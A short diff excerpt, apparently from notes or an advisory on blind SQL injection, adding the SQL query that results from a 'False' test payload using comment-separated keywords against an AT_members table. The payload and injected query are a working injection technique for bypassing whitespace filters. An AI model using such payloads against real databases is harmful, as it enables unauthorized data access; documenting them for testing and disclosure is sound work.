@@ -36,3 +36,5 @@ True:
 
 False:
 > AAAA')/**/or/**/(select/**/1)=0%23
+
+> select count(*) FROM AT_members M WHERE (first_name LIKE '%AAAA')/**/OR/**/ (select/**/1)=0#
